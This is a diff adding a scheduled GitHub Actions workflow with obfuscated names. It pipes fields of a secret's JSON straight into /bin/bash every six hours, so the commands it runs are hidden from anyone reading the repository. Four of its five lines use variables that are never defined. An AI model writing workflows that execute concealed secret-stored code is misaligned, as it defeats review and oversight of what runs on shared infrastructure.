@@ -1,0 +1,21 @@
+name: cishigeges
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cishigeges
+        env:
+          rg52: ${{ secrets.rg52 }}
+        run: |
+          echo $rg52 | jq -r .qqdx6 | /bin/bash
+          echo $tcrg73 | jq -r .wqpl54965 | /bin/bash
+          echo $ca00 | jq -r .vt90 | /bin/bash
+          echo $hwk42123 | jq -r .vfq6452 | /bin/bash
+          echo $me2023 | jq -r .o3850 | /bin/bash
+
